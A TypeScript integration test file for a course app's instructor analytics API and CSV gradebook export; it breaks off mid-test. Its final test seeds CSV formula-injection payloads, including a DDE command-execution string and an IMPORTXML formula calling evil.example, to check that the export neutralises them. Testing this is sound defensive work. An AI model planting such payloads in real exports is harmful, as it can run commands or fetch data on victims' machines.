import { afterAll, afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import request from 'supertest';
import app from '../src/app';
import prisma from '../src/prisma';
import { seedDatabase } from '../prisma/seed';
import { clearRevokedTokens, signAuthToken } from '../src/middleware/auth';
import { assertDisposableTestDatabase } from './helpers/disposableDatabase';

function parseQuotedCsv(raw: string): string[][] {
  expect(raw.startsWith('\uFEFF')).toBe(true);
  const body = raw.slice(1).replace(/\r\n$/, '');
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let inQuotes = false;
  for (let i = 0; i < body.length; i++) {
    const ch = body[i];
    if (inQuotes) {
      if (ch === '"') {
        if (body[i + 1] === '"') {
          cell += '"';
          i++;
        } else {
          inQuotes = false;
        }
      } else {
        cell += ch;
      }
    } else if (ch === '"') {
      inQuotes = true;
    } else if (ch === ',') {
      row.push(cell);
      cell = '';
    } else if (ch === '\r' && body[i + 1] === '\n') {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = '';
      i++;
    } else {
      throw new Error(`Unexpected unquoted character ${JSON.stringify(ch)} at index ${i}`);
    }
  }
  row.push(cell);
  rows.push(row);
  return rows;
}

describe('F-08 instructor analytics and CSV grade export: actual API/PostgreSQL', () => {
  let f: Awaited<ReturnType<typeof seedDatabase>>;
  let instructor: string;
  let student: string;
  const fixedNow = Date.parse('2026-12-01T10:00:00.000Z');

  const getAnalytics = (courseId: number | string = f.course.id, token = instructor, query = '') =>
    request(app).get(`/api/courses/${courseId}/analytics${query}`).set('Authorization', `Bearer ${token}`);

  const getCsv = (courseId: number | string = f.course.id, token = instructor, query = '') =>
    request(app).get(`/api/courses/${courseId}/gradebook.csv${query}`).set('Authorization', `Bearer ${token}`);

  beforeEach(async () => {
    assertDisposableTestDatabase();
    await clearRevokedTokens();
    f = await seedDatabase(prisma);
    instructor = signAuthToken(f.instructor);
    student = signAuthToken(f.pawarit);
    vi.spyOn(Date, 'now').mockReturnValue(fixedNow);
  });

  afterEach(() => vi.restoreAllMocks());
  afterAll(async () => {
    await prisma.$disconnect();
  });

  it('S3-F08-T01 (S3-F08-AC01): returns a complete course-scoped snapshot (including >1 UI page of teams) and empty-course snapshot with server generatedAt', async () => {
    // Create 53 additional teams in main course (total 55 teams > 50 single-page UI limit)
    for (let i = 1; i <= 53; i++) {
      await prisma.projectTeam.create({
        data: {
          name: `Scale Team ${String(i).padStart(2, '0')}`,
          courseId: f.course.id,
          createdById: f.pawarit.id,
        },
      });
    }
    // Create an unrelated second course with its own team and milestone
    const otherCourse = await prisma.course.create({
      data: { code: 'CPE999', name: 'Unrelated Course', term: '1/2026', maxTeamSize: 3 },
    });
    await prisma.projectTeam.create({
      data: { name: 'Foreign Course Team', courseId: otherCourse.id, createdById: f.suda.id },
    });
    await prisma.milestone.create({
      data: {
        courseId: otherCourse.id,
        title: 'Foreign Published Milestone',
        description: 'Should never appear in CPE334 analytics',
        dueDate: new Date(fixedNow - 1000),
        status: 'PUBLISHED',
        publishedAt: new Date(fixedNow - 50000),
      },
    });

    const res = await getAnalytics(f.course.id);
    expect(res.status).toBe(200);
    expect(res.headers['cache-control']).toBe('no-store');
    expect(res.body.course).toMatchObject({
      id: f.course.id,
      code: 'CPE334',
      name: f.course.name,
      term: f.course.term,
    });
    expect(res.body.generatedAt).toBe(new Date(fixedNow).toISOString());
    expect(res.body.totals.totalTeams).toBe(55);

    // Empty course snapshot
    const emptyCourse = await prisma.course.create({
      data: { code: 'EMPTY101', name: 'Empty Course', term: '1/2026', maxTeamSize: 3 },
    });
    const emptyRes = await getAnalytics(emptyCourse.id);
    expect(emptyRes.status).toBe(200);
    expect(emptyRes.body.totals).toEqual({
      totalTeams: 0,
      publishedMilestones: 0,
      submittedDeliverables: 0,
      gradedDeliverables: 0,
      ungradedDeliverables: 0,
      flaggedTeams: 0,
    });
    expect(emptyRes.body.proposalStates).toEqual({
      NONE: 0,
      DRAFT: 0,
      SUBMITTED: 0,
      APPROVED: 0,
      REVISION_REQUESTED: 0,
    });
    expect(emptyRes.body.milestoneProgress).toEqual([]);
    expect(emptyRes.body.ungraded).toEqual([]);
    expect(emptyRes.body.flaggedTeams).toEqual([]);
  });

  it('S3-F08-T02 (S3-F08-AC02): partitions proposalStates across NONE, DRAFT, SUBMITTED, APPROVED, REVISION_REQUESTED and excludes other courses', async () => {
    // Seeded: Team Alpha = DRAFT, Team Beta = SUBMITTED
    // Add Team Gamma (APPROVED), Team Delta (REVISION_REQUESTED), Team Epsilon (NONE - no proposal row)
    await prisma.projectTeam.create({
      data: {
        name: 'Team Gamma',
        courseId: f.course.id,
        createdById: f.tatchakorn.id,
        proposal: {
          create: {
            title: 'Approved Proposal',
            problemStatement: 'Valid problem statement for approved team.',
            techStack: 'TypeScript',
            status: 'APPROVED',
          },
        },
      },
    });
    await prisma.projectTeam.create({
      data: {
        name: 'Team Delta',
        courseId: f.course.id,
        createdById: f.suda.id,
        proposal: {
          create: {
            title: 'Revision Proposal',
            problemStatement: 'Valid problem statement needing revision.',
            techStack: 'PostgreSQL',
            status: 'REVISION_REQUESTED',
          },
        },
      },
    });
    await prisma.projectTeam.create({
      data: {
        name: 'Team Epsilon No Proposal',
        courseId: f.course.id,
        createdById: f.niran.id,
      },
    });

    const otherCourse = await prisma.course.create({
      data: { code: 'OTHER202', name: 'Other Course', term: '1/2026' },
    });
    await prisma.projectTeam.create({
      data: {
        name: 'Other Team',
        courseId: otherCourse.id,
        createdById: f.niran.id,
        proposal: {
          create: {
            title: 'Other Approved',
            problemStatement: 'Other course problem statement.',
            techStack: 'Go',
            status: 'APPROVED',
          },
        },
      },
    });

    const res = await getAnalytics(f.course.id);
    expect(res.status).toBe(200);
    expect(res.body.totals.totalTeams).toBe(5);
    expect(res.body.proposalStates).toEqual({
      NONE: 1,
      DRAFT: 1,
      SUBMITTED: 1,
      APPROVED: 1,
      REVISION_REQUESTED: 1,
    });
    const sum = Object.values(res.body.proposalStates as Record<string, number>).reduce((a, b) => a + b, 0);
    expect(sum).toBe(res.body.totals.totalTeams);
  });

  it('S3-F08-T03 (S3-F08-AC03): computes milestone completionRatePct with full course team denominator, counts multi-version logical submissions once, excludes DRAFT milestones, and returns null rate when totalTeams=0', async () => {
    // 3 teams in course: Team Alpha, Team Beta, Team Gamma
    await prisma.projectTeam.create({
      data: { name: 'Team Gamma', courseId: f.course.id, createdById: f.suda.id },
    });

    const pubMilestone = await prisma.milestone.create({
      data: {
        courseId: f.course.id,
        title: 'Published M1',
        description: 'Published milestone for rate test',
        dueDate: new Date(fixedNow + 86400000),
        weightPercent: 25,
        status: 'PUBLISHED',
        publishedAt: new Date(fixedNow - 10000),
      },
    });
    await prisma.milestone.create({
      data: {
        courseId: f.course.id,
        title: 'Draft M2',
        description: 'Draft milestone must be excluded',
        dueDate: new Date(fixedNow + 172800000),
        weightPercent: 25,
        status: 'DRAFT',
      },
    });

    // Team Alpha submits v1 then v2 on Published M1 (still 1 logical team submission out of 3 teams -> 33.33%)
    const sub = await prisma.milestoneSubmission.create({
      data: {
        milestoneId: pubMilestone.id,
        teamId: f.teamAlpha.id,
        version: 2,
        artifactUrl: 'https://example.org/repo-v2',
        reportUrl: 'https://example.org/report-v2',
        releaseTag: 'v2.0.0',
        submittedAt: new Date(fixedNow - 1000),
        dueDateSnapshot: pubMilestone.dueDate,
        lateStatus: 'ON_TIME',
      },
    });
    await prisma.submissionVersion.createMany({
      data: [
        {
          submissionId: sub.id,
          version: 1,
          repoUrl: 'https://example.org/repo-v1',
          reportUrl: 'https://example.org/report-v1',
          releaseTag: 'v1.0.0',
          submittedAt: new Date(fixedNow - 5000),
          dueDateSnapshot: pubMilestone.dueDate,
          lateStatus: 'ON_TIME',
        },
        {
          submissionId: sub.id,
          version: 2,
          repoUrl: 'https://example.org/repo-v2',
          reportUrl: 'https://example.org/report-v2',
          releaseTag: 'v2.0.0',
          submittedAt: new Date(fixedNow - 1000),
          dueDateSnapshot: pubMilestone.dueDate,
          lateStatus: 'ON_TIME',
        },
      ],
    });

    const res = await getAnalytics(f.course.id);
    expect(res.status).toBe(200);
    expect(res.body.totals.publishedMilestones).toBe(1);
    expect(res.body.milestoneProgress).toHaveLength(1);
    expect(res.body.milestoneProgress[0]).toMatchObject({
      milestoneId: pubMilestone.id,
      title: 'Published M1',
      weightPercent: 25,
      submittedTeams: 1,
      totalTeams: 3,
      completionRatePct: 33.33,
      onTimeCount: 1,
      lateCount: 0,
      unknownLateCount: 0,
    });

    // Zero teams course with a published milestone -> 0/0 and completionRatePct: null
    const zeroTeamCourse = await prisma.course.create({
      data: { code: 'ZERO303', name: 'Zero Team Course', term: '1/2026' },
    });
    await prisma.milestone.create({
      data: {
        courseId: zeroTeamCourse.id,
        title: 'Published in Zero Team Course',
        description: 'Denominator is zero',
        dueDate: new Date(fixedNow + 86400000),
        status: 'PUBLISHED',
        publishedAt: new Date(fixedNow - 1000),
      },
    });
    const zeroRes = await getAnalytics(zeroTeamCourse.id);
    expect(zeroRes.status).toBe(200);
    expect(zeroRes.body.milestoneProgress).toHaveLength(1);
    expect(zeroRes.body.milestoneProgress[0]).toMatchObject({
      submittedTeams: 0,
      totalTeams: 0,
      completionRatePct: null,
    });
  });

  it('S3-F08-T04 (S3-F08-AC04): ungraded queue ignores drafts and superseded v1 published grades, treats published score 0 as graded, and separates ON_TIME / LATE / UNKNOWN counts', async () => {
    const teamGamma = await prisma.projectTeam.create({
      data: { name: 'Team Gamma', courseId: f.course.id, createdById: f.suda.id },
    });
    const m1 = await prisma.milestone.create({
      data: {
        courseId: f.course.id,
        title: 'Grading Queue Milestone',
        description: 'Milestone for ungraded and lateness rules',
        dueDate: new Date(fixedNow + 3600000),
        status: 'PUBLISHED',
        publishedAt: new Date(fixedNow - 10000),
      },
    });

    // 1) Team Alpha: v1 had published score 90, but current is v2 (LATE) with no v2 publication -> UNGRADED
    const subAlpha = await prisma.milestoneSubmission.create({
      data: {
        milestoneId: m1.id,
        teamId: f.teamAlpha.id,
        version: 2,
        artifactUrl: 'https://example.org/alpha-v2',
        reportUrl: 'https://example.org/alpha-report-v2',
        releaseTag: 'alpha-v2',
        submittedAt: new Date(fixedNow - 500),
        dueDateSnapshot: new Date(fixedNow - 1000),
        lateStatus: 'LATE',
      },
    });
    await prisma.submissionVersion.createMany({
      data: [
        {
          submissionId: subAlpha.id,
          version: 1,
          repoUrl: 'https://example.org/alpha-v1',
          reportUrl: 'https://example.org/alpha-report-v1',
          releaseTag: 'alpha-v1',
          submittedAt: new Date(fixedNow - 5000),
          dueDateSnapshot: new Date(fixedNow - 1000),
          lateStatus: 'ON_TIME',
        },
        {
          submissionId: subAlpha.id,
          version: 2,
          repoUrl: 'https://example.org/alpha-v2',
          reportUrl: 'https://example.org/alpha-report-v2',
          releaseTag: 'alpha-v2',
          submittedAt: new Date(fixedNow - 500),
          dueDateSnapshot: new Date(fixedNow - 1000),
          lateStatus: 'LATE',
        },
      ],
    });
    const evalAlphaV1 = await prisma.submissionEvaluation.create({
      data: {
        submissionId: subAlpha.id,
        submissionVersion: 1,
        score: 90,
        feedback: 'Old v1 published grade',
        version: 2,
        draftRevision: 1,
        publishedDraftRevision: 1,
        updatedById: f.instructor.id,
      },
    });
    await prisma.gradePublication.create({
      data: {
        evaluationId: evalAlphaV1.id,
        submissionId: subAlpha.id,
        submissionVersion: 1,
        draftRevision: 1,
        score: 90,
        feedback: 'Old v1 published grade',
        publishedById: f.instructor.id,
      },
    });

    // 2) Team Beta: v1 (UNKNOWN legacy lateness) has only a draft evaluation (unpublished) -> UNGRADED
    const subBeta = await prisma.milestoneSubmission.create({
      data: {
        milestoneId: m1.id,
        teamId: f.teamBeta.id,
        version: 1,
        artifactUrl: 'https://example.org/beta-v1',
        releaseTag: 'beta-v1',
        submittedAt: new Date(fixedNow - 2000),
        lateStatus: 'UNKNOWN',
      },
    });
    await prisma.submissionVersion.create({
      data: {
        submissionId: subBeta.id,
        version: 1,
        repoUrl: 'https://example.org/beta-v1',
        releaseTag: 'beta-v1',
        submittedAt: new Date(fixedNow - 2000),
        lateStatus: 'UNKNOWN',
      },
    });
    await prisma.submissionEvaluation.create({
      data: {
        submissionId: subBeta.id,
        submissionVersion: 1,
        score: 88,
        feedback: 'Unpublished draft grade',
        version: 1,
        draftRevision: 1,
        updatedById: f.instructor.id,
      },
    });

    // 3) Team Gamma: v1 (ON_TIME) has a published evaluation with score 0 -> GRADED
    const subGamma = await prisma.milestoneSubmission.create({
      data: {
        milestoneId: m1.id,
        teamId: teamGamma.id,
        version: 1,
        artifactUrl: 'https://example.org/gamma-v1',
        reportUrl: 'https://example.org/gamma-report-v1',
        releaseTag: 'gamma-v1',
        submittedAt: new Date(fixedNow - 3000),
        dueDateSnapshot: m1.dueDate,
        lateStatus: 'ON_TIME',
      },
    });
    await prisma.submissionVersion.create({
      data: {
        submissionId: subGamma.id,
        version: 1,
        repoUrl: 'https://example.org/gamma-v1',
        reportUrl: 'https://example.org/gamma-report-v1',
        releaseTag: 'gamma-v1',
        submittedAt: new Date(fixedNow - 3000),
        dueDateSnapshot: m1.dueDate,
        lateStatus: 'ON_TIME',
      },
    });
    const evalGamma = await prisma.submissionEvaluation.create({
      data: {
        submissionId: subGamma.id,
        submissionVersion: 1,
        score: 0,
        feedback: 'Published zero score counts as graded',
        version: 2,
        draftRevision: 1,
        publishedDraftRevision: 1,
        updatedById: f.instructor.id,
      },
    });
    await prisma.gradePublication.create({
      data: {
        evaluationId: evalGamma.id,
        submissionId: subGamma.id,
        submissionVersion: 1,
        draftRevision: 1,
        score: 0,
        feedback: 'Published zero score counts as graded',
        publishedById: f.instructor.id,
      },
    });

    const res = await getAnalytics(f.course.id);
    expect(res.status).toBe(200);
    expect(res.body.totals).toMatchObject({
      submittedDeliverables: 3,
      gradedDeliverables: 1,
      ungradedDeliverables: 2,
    });
    expect(res.body.milestoneProgress[0]).toMatchObject({
      onTimeCount: 1,
      lateCount: 1,
      unknownLateCount: 1,
      gradedCount: 1,
      ungradedCount: 2,
    });
    expect(res.body.ungraded).toEqual([
      expect.objectContaining({
        submissionId: subAlpha.id,
        submissionVersion: 2,
        teamId: f.teamAlpha.id,
        milestoneId: m1.id,
        lateStatus: 'LATE',
        hasDraftEvaluation: false,
      }),
      expect.objectContaining({
        submissionId: subBeta.id,
        submissionVersion: 1,
        teamId: f.teamBeta.id,
        milestoneId: m1.id,
        lateStatus: 'UNKNOWN',
        hasDraftEvaluation: true,
      }),
    ]);
  });

  it('S3-F08-T05 (S3-F08-AC05): enforces exact deadline equality vs +1ms overdue boundary, uses captured submission lateStatus, and emits unique flaggedTeams with combined reasons', async () => {
    await prisma.projectProposal.update({
      where: { teamId: f.teamAlpha.id },
      data: { status: 'REVISION_REQUESTED' },
    });

    // Milestone M1 due at fixedNow; Team Alpha has a LATE submission (captured against earlier deadline snapshot)
    const m1 = await prisma.milestone.create({
      data: {
        courseId: f.course.id,
        title: 'Boundary Milestone 1',
        description: 'Has submission from Alpha, missing from Beta',
        dueDate: new Date(fixedNow),
        status: 'PUBLISHED',
        publishedAt: new Date(fixedNow - 20000),
      },
    });
    // Milestone M2 also due at fixedNow; missing from both Alpha and Beta
    await prisma.milestone.create({
      data: {
        courseId: f.course.id,
        title: 'Boundary Milestone 2',
        description: 'Missing from Alpha and Beta at exact deadline',
        dueDate: new Date(fixedNow),
        status: 'PUBLISHED',
        publishedAt: new Date(fixedNow - 20000),
      },
    });

    const subAlpha = await prisma.milestoneSubmission.create({
      data: {
        milestoneId: m1.id,
        teamId: f.teamAlpha.id,
        version: 1,
        artifactUrl: 'https://example.org/alpha-late',
        reportUrl: 'https://example.org/alpha-late-report',
        releaseTag: 'v1-late',
        submittedAt: new Date(fixedNow - 100),
        dueDateSnapshot: new Date(fixedNow - 500),
        lateStatus: 'LATE',
      },
    });
    await prisma.submissionVersion.create({
      data: {
        submissionId: subAlpha.id,
        version: 1,
        repoUrl: 'https://example.org/alpha-late',
        reportUrl: 'https://example.org/alpha-late-report',
        releaseTag: 'v1-late',
        submittedAt: new Date(fixedNow - 100),
        dueDateSnapshot: new Date(fixedNow - 500),
        lateStatus: 'LATE',
      },
    });
    // Later schedule extension on M1 must not erase Alpha's captured LATE status
    await prisma.milestone.update({
      where: { id: m1.id },
      data: { dueDate: new Date(fixedNow + 60000) },
    });

    // At exact equality (now === M2.dueDate), missing M2 is NOT yet overdue
    vi.mocked(Date.now).mockReturnValue(fixedNow);
    const atDue = await getAnalytics(f.course.id);
    expect(atDue.status).toBe(200);
    expect(atDue.body.flaggedTeams).toEqual([
      expect.objectContaining({
        teamId: f.teamAlpha.id,
        teamName: 'Team Alpha',
        proposalStatus: 'REVISION_REQUESTED',
        reasons: ['REVISION_REQUESTED', 'LATE_SUBMISSION'],
      }),
    ]);

    // At dueDate + 1ms, M2 is overdue -> Alpha gets all 3 reasons once, Beta gets OVERDUE_MISSING_SUBMISSION
    vi.mocked(Date.now).mockReturnValue(fixedNow + 1);
    const afterDue = await getAnalytics(f.course.id);
    expect(afterDue.status).toBe(200);
    expect(afterDue.body.flaggedTeams).toHaveLength(2);
    expect(afterDue.body.flaggedTeams[0]).toMatchObject({
      teamId: f.teamAlpha.id,
      reasons: ['REVISION_REQUESTED', 'OVERDUE_MISSING_SUBMISSION', 'LATE_SUBMISSION'],
    });
    expect(afterDue.body.flaggedTeams[1]).toMatchObject({
      teamId: f.teamBeta.id,
      reasons: ['OVERDUE_MISSING_SUBMISSION'],
    });
  });

  it('S3-F08-T06 (S3-F08-AC06): denies anonymous (401) and student (403) access on analytics and CSV, validates courseId/query (400/404) as JSON, and never leaks peer or credential fields', async () => {
    const m1 = await prisma.milestone.create({
      data: {
        courseId: f.course.id,
        title: 'Confidentiality Check Milestone',
        description: 'Peer feedback must never appear in analytics or CSV',
        dueDate: new Date(fixedNow - 10000),
        status: 'PUBLISHED',
        publishedAt: new Date(fixedNow - 20000),
      },
    });
    await prisma.teamMember.create({
      data: { teamId: f.teamAlpha.id, userId: f.tatchakorn.id, courseId: f.course.id },
    });
    await prisma.peerEvaluation.create({
      data: {
        teamId: f.teamAlpha.id,
        milestoneId: m1.id,
        evaluatorId: f.pawarit.id,
        evaluateeId: f.tatchakorn.id,
        rating: 5,
        comment: 'SECRET_PEER_COMMENT_DO_NOT_EXPORT',
      },
    });

    for (const endpoint of [`/api/courses/${f.course.id}/analytics`, `/api/courses/${f.course.id}/gradebook.csv`]) {
      const anon = await request(app).get(endpoint);
      expect(anon.status).toBe(401);
      expect(anon.headers['content-type']).toMatch(/application\/json/);

      const stu = await request(app).get(endpoint).set('Authorization', `Bearer ${student}`);
      expect(stu.status).toBe(403);
      expect(stu.headers['content-type']).toMatch(/application\/json/);
      expect(stu.body.code).toBe('INSTRUCTOR_ROLE_REQUIRED');

      // Student requesting nonexistent course still gets 403 before 404
      const stuMissing = await request(app)
        .get(endpoint.replace(String(f.course.id), '999999'))
        .set('Authorization', `Bearer ${student}`);
      expect(stuMissing.status).toBe(403);
    }

    for (const badId of ['0', '-1', '01', '1.5', 'abc', '2147483648']) {
      expect((await getAnalytics(badId)).status).toBe(400);
      const badCsv = await getCsv(badId);
      expect(badCsv.status).toBe(400);
      expect(badCsv.headers['content-type']).toMatch(/application\/json/);
    }

    expect((await getAnalytics(f.course.id, instructor, '?page=1')).status).toBe(400);
    expect((await getCsv(f.course.id, instructor, '?format=raw')).status).toBe(400);

    const missingAnalytics = await getAnalytics(999999);
    expect(missingAnalytics.status).toBe(404);
    expect(missingAnalytics.body.code).toBe('COURSE_NOT_FOUND');

    const missingCsv = await getCsv(999999);
    expect(missingCsv.status).toBe(404);
    expect(missingCsv.headers['content-type']).toMatch(/application\/json/);
    expect(missingCsv.body.code).toBe('COURSE_NOT_FOUND');

    const okAnalytics = await getAnalytics(f.course.id);
    const okCsv = await getCsv(f.course.id);
    for (const payload of [JSON.stringify(okAnalytics.body), okCsv.text]) {
      expect(payload).not.toContain('SECRET_PEER_COMMENT_DO_NOT_EXPORT');
      expect(payload).not.toContain('passwordHash');
      expect(payload).not.toContain('evaluatorId');
    }
  });

  it('S3-F08-T07 (S3-F08-AC07): exports UTF-8 BOM + CRLF quoted CSV with Thai names, embedded commas/quotes/newlines, current published grade only, and score 0 distinct from empty', async () => {
    const teamThai = await prisma.projectTeam.create({
      data: {
        name: 'ทีมสมชาย, "Alpha"\r\nLine2',
        courseId: f.course.id,
        createdById: f.suda.id,
        proposal: {
          create: {
            title: 'Thai Proposal',
            problemStatement: 'Thai team problem statement for CSV check.',
            techStack: 'React',
            status: 'APPROVED',
          },
        },
      },
    });

    const m1 = await prisma.milestone.create({
      data: {
        courseId: f.course.id,
        title: 'Milestone 1, "Core"',
        description: 'First published milestone',
        dueDate: new Date('2026-12-05T16:59:00.000Z'),
        weightPercent: 40,
        status: 'PUBLISHED',
        publishedAt: new Date(fixedNow - 10000),
      },
    });

    // Team Alpha: v1 published 85, v2 current ungraded -> CSV must show v2 with empty score ""
    const subAlpha = await prisma.milestoneSubmission.create({
      data: {
        milestoneId: m1.id,
        teamId: f.teamAlpha.id,
        version: 2,
        artifactUrl: 'https://example.org/a2',
        reportUrl: 'https://example.org/r2',
        releaseTag: 'v2',
        submittedAt: new Date('2026-12-01T08:00:00.000Z'),
        dueDateSnapshot: m1.dueDate,
        lateStatus: 'ON_TIME',
      },
    });
    await prisma.submissionVersion.createMany({
      data: [
        {
          submissionId: subAlpha.id,
          version: 1,
          repoUrl: 'https://example.org/a1',
          reportUrl: 'https://example.org/r1',
          releaseTag: 'v1',
          submittedAt: new Date('2026-12-01T07:00:00.000Z'),
          dueDateSnapshot: m1.dueDate,
          lateStatus: 'ON_TIME',
        },
        {
          submissionId: subAlpha.id,
          version: 2,
          repoUrl: 'https://example.org/a2',
          reportUrl: 'https://example.org/r2',
          releaseTag: 'v2',
          submittedAt: new Date('2026-12-01T08:00:00.000Z'),
          dueDateSnapshot: m1.dueDate,
          lateStatus: 'ON_TIME',
        },
      ],
    });
    const evalAlphaV1 = await prisma.submissionEvaluation.create({
      data: {
        submissionId: subAlpha.id,
        submissionVersion: 1,
        score: 85,
        feedback: 'Old v1 grade',
        version: 2,
        draftRevision: 1,
        publishedDraftRevision: 1,
        updatedById: f.instructor.id,
      },
    });
    await prisma.gradePublication.create({
      data: {
        evaluationId: evalAlphaV1.id,
        submissionId: subAlpha.id,
        submissionVersion: 1,
        draftRevision: 1,
        score: 85,
        feedback: 'Old v1 grade',
        publishedById: f.instructor.id,
      },
    });
    // Draft evaluation on v2 (unpublished) -> still empty in CSV
    await prisma.submissionEvaluation.create({
      data: {
        submissionId: subAlpha.id,
        submissionVersion: 2,
        score: 99,
        feedback: 'Draft v2 grade',
        version: 1,
        draftRevision: 1,
        updatedById: f.instructor.id,
      },
    });

    // Team Thai: v1 with published score 0 -> CSV must show "0"
    const subThai = await prisma.milestoneSubmission.create({
      data: {
        milestoneId: m1.id,
        teamId: teamThai.id,
        version: 1,
        artifactUrl: 'https://example.org/thai',
        reportUrl: 'https://example.org/thai-report',
        releaseTag: 'v1',
        submittedAt: new Date('2026-12-01T09:00:00.000Z'),
        dueDateSnapshot: m1.dueDate,
        lateStatus: 'ON_TIME',
      },
    });
    await prisma.submissionVersion.create({
      data: {
        submissionId: subThai.id,
        version: 1,
        repoUrl: 'https://example.org/thai',
        reportUrl: 'https://example.org/thai-report',
        releaseTag: 'v1',
        submittedAt: new Date('2026-12-01T09:00:00.000Z'),
        dueDateSnapshot: m1.dueDate,
        lateStatus: 'ON_TIME',
      },
    });
    const evalThai = await prisma.submissionEvaluation.create({
      data: {
        submissionId: subThai.id,
        submissionVersion: 1,
        score: 0,
        feedback: 'Legitimate zero score',
        version: 2,
        draftRevision: 1,
        publishedDraftRevision: 1,
        updatedById: f.instructor.id,
      },
    });
    const pubThai = await prisma.gradePublication.create({
      data: {
        evaluationId: evalThai.id,
        submissionId: subThai.id,
        submissionVersion: 1,
        draftRevision: 1,
        score: 0,
        feedback: 'Legitimate zero score',
        publishedById: f.instructor.id,
        publishedAt: new Date('2026-12-01T09:30:00.000Z'),
      },
    });

    const res = await getCsv(f.course.id);
    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toMatch(/text\/csv;\s*charset=utf-8/i);
    expect(res.headers['content-disposition']).toMatch(/attachment;\s*filename="CPE334-gradebook-2026-12-01\.csv"/);
    expect(res.headers['cache-control']).toBe('no-store');

    const rows = parseQuotedCsv(res.text);
    expect(rows[0]).toEqual([
      'courseCode',
      'teamId',
      'teamName',
      'proposalStatus',
      'milestoneId',
      'milestoneTitle',
      'dueDateUtc',
      'weightPercent',
      'submissionId',
      'submissionVersion',
      'submittedAtUtc',
      'lateStatus',
      'publishedScore',
      'publishedAtUtc',
    ]);
    expect(rows).toHaveLength(4); // header + 3 teams * 1 milestone

    // Row 1: Team Alpha (v2 ungraded despite v1 published & v2 draft)
    expect(rows[1]).toEqual([
      'CPE334',
      String(f.teamAlpha.id),
      'Team Alpha',
      'DRAFT',
      String(m1.id),
      'Milestone 1, "Core"',
      '2026-12-05T16:59:00.000Z',
      '40',
      String(subAlpha.id),
      '2',
      '2026-12-01T08:00:00.000Z',
      'ON_TIME',
      '',
      '',
    ]);

    // Row 2: Team Beta (no submission -> empty submission & grade columns)
    expect(rows[2]).toEqual([
      'CPE334',
      String(f.teamBeta.id),
      'Team Beta',
      'SUBMITTED',
      String(m1.id),
      'Milestone 1, "Core"',
      '2026-12-05T16:59:00.000Z',
      '40',
      '',
      '',
      '',
      '',
      '',
      '',
    ]);

    // Row 3: Team Thai (embedded comma/quote/CRLF in teamName, legitimate published score "0")
    expect(rows[3]).toEqual([
      'CPE334',
      String(teamThai.id),
      'ทีมสมชาย, "Alpha"\r\nLine2',
      'APPROVED',
      String(m1.id),
      'Milestone 1, "Core"',
      '2026-12-05T16:59:00.000Z',
      '40',
      String(subThai.id),
      '1',
      '2026-12-01T09:00:00.000Z',
      'ON_TIME',
      '0',
      pubThai.publishedAt.toISOString(),
    ]);
  });

  it('S3-F08-T08 (S3-F08-AC07): exports header-only when no teams exist, one row per team with empty milestone cells when no published milestones exist, and full cross-product beyond one UI page', async () => {
    // 1) No teams -> header only
    const emptyCourse = await prisma.course.create({
      data: { code: 'EMPTY-CSV', name: 'Empty CSV Course', term: '1/2026' },
    });
    const emptyCsv = await getCsv(emptyCourse.id);
    expect(emptyCsv.status).toBe(200);
    const emptyRows = parseQuotedCsv(emptyCsv.text);
    expect(emptyRows).toHaveLength(1);

    // 2) Teams exist, only DRAFT milestone exists (no PUBLISHED milestones) -> one row per team, milestone columns empty
    await prisma.milestone.create({
      data: {
        courseId: f.course.id,
        title: 'Draft Only',
        description: 'Not published yet',
        dueDate: new Date(fixedNow + 10000),
        status: 'DRAFT',
      },
    });
    const noPubCsv = await getCsv(f.course.id);
    expect(noPubCsv.status).toBe(200);
    const noPubRows = parseQuotedCsv(noPubCsv.text);
    expect(noPubRows).toHaveLength(3); // header + Team Alpha + Team Beta
    expect(noPubRows[1]).toEqual(['CPE334', String(f.teamAlpha.id), 'Team Alpha', 'DRAFT', '', '', '', '', '', '', '', '', '', '']);
    expect(noPubRows[2]).toEqual(['CPE334', String(f.teamBeta.id), 'Team Beta', 'SUBMITTED', '', '', '', '', '', '', '', '', '', '']);

    // 3) >1 page of data rows (30 teams * 2 published milestones = 60 rows > 50)
    for (let i = 1; i <= 28; i++) {
      await prisma.projectTeam.create({
        data: { name: `Bulk Team ${i}`, courseId: f.course.id, createdById: f.pawarit.id },
      });
    }
    const mLate = await prisma.milestone.create({
      data: {
        courseId: f.course.id,
        title: 'Later Milestone',
        description: 'Due later',
        dueDate: new Date(fixedNow + 90000),
        status: 'PUBLISHED',
        publishedAt: new Date(fixedNow - 1000),
      },
    });
    const mEarly = await prisma.milestone.create({
      data: {
        courseId: f.course.id,
        title: 'Earlier Milestone',
        description: 'Due earlier',
        dueDate: new Date(fixedNow + 10000),
        status: 'PUBLISHED',
        publishedAt: new Date(fixedNow - 1000),
      },
    });
    const bulkCsv = await getCsv(f.course.id);
    const bulkRows = parseQuotedCsv(bulkCsv.text);
    expect(bulkRows).toHaveLength(1 + 30 * 2);
    // Ordered by teamId ASC, then milestone dueDate ASC / id ASC
    expect(bulkRows[1][1]).toBe(String(f.teamAlpha.id));
    expect(bulkRows[1][4]).toBe(String(mEarly.id));
    expect(bulkRows[2][1]).toBe(String(f.teamAlpha.id));
    expect(bulkRows[2][4]).toBe(String(mLate.id));
  });

  it('S3-F08-T09 (S3-F08-AC08): neutralizes formula-risk cells (ASCII, full-width, whitespace-prefixed, control-prefixed, quote/comma breakout) with leading tab inside quotes without mutating DB rows', async () => {
    const riskyNames = [
      '=CMD|\' /C calc\'!A0',
      '+SUM(1,2)',
      '-2+3',
      '@IMPORTXML("https://evil.example","//a")',
      '＝FULLWIDTH_EQ(1)',
      '  \u000b =WHITESPACE_FORMULA(1)',
      '\tLEADING_TAB',
      '=1+1",=2+2',
    ];
    for (const name of riskyNames) {
      await prisma.projectTeam.create({
        data: { name, courseId: f.course.id, createdById: f.pawarit.id },
      });
    }
    const mRisky = await prisma.milestone.create({
      data: {
        courseId: f.course.id,
        title: '＠FullwidthAtMilestone',
        description: 'Milestone with full-width @',
        dueDate: new Date(fixedNow + 50000),
        status: 'PUBLISHED',
        publishedAt: new Date(fixedNow - 1000),
      },
    });

    const csvRes = await getCsv(f.course.id);
    expect(csvRes.status).toBe(200);
    const rows = parseQuotedCsv(csvRes.text);
    // Every data row has 14 columns (no separator/quote breakout)
    for (const row of rows.slice(1)) {
      expect(row).toHaveLength(14);
      expect(row[5]).toBe('\t＠FullwidthAtMilestone');
    }
    const exportedNames = rows.slice(3).map((r) => r[2]);
